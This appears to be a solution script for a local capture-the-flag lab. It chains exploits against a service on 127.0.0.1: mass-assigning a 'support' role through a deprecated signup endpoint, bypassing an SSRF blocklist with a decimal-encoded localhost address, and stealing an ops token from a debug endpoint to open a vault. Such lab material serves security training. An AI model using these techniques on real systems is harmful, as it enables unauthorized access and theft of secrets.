#!/usr/bin/env bash
# Lab 42 — recon → deprecated endpoint → mass assignment → SSRF past a
# blocklist → a debug endpoint → the vault.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9420}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab42

"$H5I" browser open "$URL/robots.txt" --session "$SESSION" --new --capture >/dev/null

# 1. Recon: robots names /internal/, and the handover note names everything else.
send "$SESSION" req_0 --set path=/internal/handover.md | body >&2; echo >&2

# 2. The deprecated signup is one header away, and merges the body whole.
TOKEN="$(send "$SESSION" req_0 --create --set method=POST --set path=/api/v1/signup \
    --set header.Content-Type=application/json --set header.X-Api-Version=0 \
    --set "json.user=climber$$" --set json.role=support | jfield token)"

# 3. Support unlocks the fetcher. 2130706433 is 127.0.0.1 the blocklist has not
#    heard of.
ssrf() {
    send "$SESSION" req_0 --create --reset-budget --set path=/api/support/fetch \
        --set "header.Authorization=Bearer $TOKEN" --set "query.url=http://2130706433:9421$1"
}

# 4. The debug endpoint the handover note says should have been removed.
OPS="$(ssrf /debug/env | body | python3 -c '
import json, sys, re
outer = json.loads(sys.stdin.read())
print(json.loads(outer["body"])["OPS_TOKEN"])')"

# 5. The vault.
ssrf "/vault?token=$OPS" | flag
